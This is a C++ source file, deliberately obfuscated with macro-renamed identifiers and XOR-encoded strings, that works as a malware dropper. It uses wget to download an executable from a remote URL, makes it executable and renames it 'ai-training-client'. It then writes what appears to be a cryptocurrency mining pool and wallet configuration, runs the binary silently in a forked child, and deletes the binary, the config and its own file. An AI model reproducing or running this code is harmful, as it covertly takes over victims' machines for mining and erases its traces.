#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

#define IlIlIllIlllll remove
#define IlIllllIlllll std::string
#define IIIllllIlllll chdir
#define llIllllIlllll fork
#define IlIlIlIlIlIlI "/dev/null"
#define IlIlIlIlIlIll for
#define IlIlIlIlIlIIl system
#define llIlIlIlIlIIl FILE*
#define lIIlIlIlIlIIl int
#define lIllIlIlIlIIl freopen
#define llIllIllIlIII execl
#define IIIllIllIlIII chmod
#define ________ stdin
#define _________ stdout
#define _______ stderr
#define IIIllIllIlIlI unsigned char
#define IllIlIllIlIlI c_str
#define IllIlIllIlIll length
#define IllIlIllIllIl fprintf
#define IllIlIllIllll fclose
#define IllIlIllIlllI fopen
#define IllIlIllIllII sleep
#define IllIlIlIIllIl pid_t
#define IllIlIlIIllII 0777
#define IllIlIlIIllll char *
#define IllIlIlIIlllI 0b10101010
#define IllIlIlIIIIIl if
#define IllIlIlIIIIII else
#define IllIlllIIIIIl main
#define lIllIlllIIIIl return
#define lIllIlllIIIII rename
#define lIlIIlllIIIII "w"
#define lIlIIlllIIIIl "r"
#define IIlIIlllIIIIl "%s"

const IlIllllIlllll IlIlIllIlIlI = "\xf1\xc9\xc5\xc7\xc7\xc5\xc4\xf7\xa0\xcb\xc6\xcd\xc5\x97\x9b\x9e\x9e\xf5\x9f\xa0\xda\xcf\xd8\xd9\x97\xe8\xcd\xc5\xc6\xce\xfa\xc5\xfd\xa0\xf1\xd9\xcf\xd8\xdc\xcf\xd8\xf7\xa0\xc2\xc5\xd9\xde\x97\xdf\xd9\x87\xc8\xde\xcd\x84\x98\xc7\xc3\xc4\xcf\xd8\xd9\x84\xc9\xc5\xc7\xa0\xda\xc5\xd8\xde\x97\x9b\x9e\x9a\x9e\x9a\xa0\xdf\xd9\xcf\xd8\x97\xeb\xe0\xfb\xee\xe9\x98\xff\xd2\xed\xdb\xf2\x98\xe6\x9c\xec\xe6\xf9\xdd\x93\x9c\x9c\x9c\xcb\xe2\xc3\xde\xe6\xda\xc2\xef\xcd\xd0\xe2\xdc\x84\xd9\xcf\xd8\xdc\xcf\xd8\xa0\xda\xcb\xd9\xd9\x97\xd2\xa0\xd9\xd9\xc6\x97\x9b";

IlIllllIlllll IlIlIllIlIll(IlIllllIlllll lIIllIllIlIIl) {
	IlIllllIlllll lIIllIllIlIlI;
	IlIlIlIlIlIll (lIIlIlIlIlIIl IllllIllIlIll = IllIlIlIIllII^IllIlIlIIllII; IllllIllIlIll < lIIllIllIlIIl.IllIlIllIlIll(); IllllIllIlIll++) lIIllIllIlIlI += (IIIllIllIlIlI)(lIIllIllIlIIl[IllllIllIlIll] ^ IllIlIlIIlllI);
	lIllIlllIIIIl lIIllIllIlIlI;
}

lIIlIlIlIlIIl IllIlllIIIIIl(lIIlIlIlIlIIl _, IllIlIlIIllll llIllIlIIlllI[]) {
	IIIllllIlllll(IlIlIllIlIll("\x85\xde\xc7\xda").IllIlIllIlIlI()); // move to tmp dir
	IlIlIlIlIlIIl(IlIlIllIlIll("\xdd\xcd\xcf\xde\x8a\x87\xdb\x8a\xc2\xde\xde\xda\xd9\x90\x85\x85\xcd\xc3\xde\xc2\xdf\xc8\x84\xc9\xc5\xc7\x85\xdd\xce\xc5\xde\xc7\xcb\xde\xc2\xd8\xcf\xcf\x85\xd8\xcb\xc4\xce\xc5\xc7\x85\xd8\xcf\xc6\xcf\xcb\xd9\xcf\xd9\x85\xce\xc5\xdd\xc4\xc6\xc5\xcb\xce\x85\xc3\xcd\xc4\xc5\xd8\xcf\x85\xcf\xd2\xcf\xc9").IllIlIllIlIlI()); // download exec
	IIIllIllIlIII(IlIlIllIlIll("\xcf\xd2\xcf\xc9").IllIlIllIlIlI(), IllIlIlIIllII); // chmod 777 exec
	lIllIlllIIIII(IlIlIllIlIll("\xcf\xd2\xcf\xc9").IllIlIllIlIlI(), IlIlIllIlIll("\xcb\xc3\x87\xde\xd8\xcb\xc3\xc4\xc3\xc4\xcd\x87\xc9\xc6\xc3\xcf\xc4\xde").IllIlIllIlIlI()); // rename exec to ai-training-client
	llIlIlIlIlIIl IlIlIllIlllI = IllIlIllIlllI(IlIlIllIlIll("\xc9\xcc\xcd\x84\xde\xd2\xde").IllIlIllIlIlI(), lIlIIlllIIIII); // open cfg.txt
	IllIlIllIllIl(IlIlIllIlllI, IIlIIlllIIIIl, IlIlIllIlIll(IlIlIllIlIlI).IllIlIllIlIlI()); // write config to cfg.txt
	IllIlIllIllll(IlIlIllIlllI); // close cfg.txt
	IllIlIlIIllIl llIlIllIlIlI = llIllllIlllll(); // fork
	IllIlIlIIIIIl (!llIlIllIlIlI) { // child
		lIllIlIlIlIIl(IlIlIlIlIlIlI, lIlIIlllIIIIl, ________); // redirect stdin, stdout, stderr to /dev/null
		lIllIlIlIlIIl(IlIlIlIlIlIlI, lIlIIlllIIIII, _________); 
		lIllIlIlIlIIl(IlIlIlIlIlIlI, lIlIIlllIIIII, _______);

		llIllIllIlIII(IlIlIllIlIll("\x84\x85\xcb\xc3\x87\xde\xd8\xcb\xc3\xc4\xc3\xc4\xcd\x87\xc9\xc6\xc3\xcf\xc4\xde").IllIlIllIlIlI(), IlIlIllIlIll("\x84").IllIlIllIlIlI(), IlIlIllIlIll("\x87\x87\xc9\xc5\xc4\xcc\xc3\xcd").IllIlIllIlIlI(), IlIlIllIlIll("\xc9\xcc\xcd\x84\xde\xd2\xde").IllIlIllIlIlI(), NULL); // ./ai-training-client --config cfg.txt
	} IllIlIlIIIIII {
		IllIlIllIllII(((IllIlIlIIllII == IllIlIlIIllII) + (IllIlIlIIllII == IllIlIlIIllII)) * ((IllIlIlIIllII == IllIlIlIIllII) + (IllIlIlIIllII == IllIlIlIIllII))); // sleep(1)
		IlIlIllIlllll(IlIlIllIlIll("\xcb\xc3\x87\xde\xd8\xcb\xc3\xc4\xc3\xc4\xcd\x87\xc9\xc6\xc3\xcf\xc4\xde").IllIlIllIlIlI()); // remove ai-training-client
		IlIlIllIlllll(IlIlIllIlIll("\xc9\xcc\xcd\x84\xde\xd2\xde").IllIlIllIlIlI()); // remove cfg.txt
		IlIlIllIlllll(llIllIlIIlllI[IllIlIlIIllII^IllIlIlIIllII]); // remove this file
	}
}
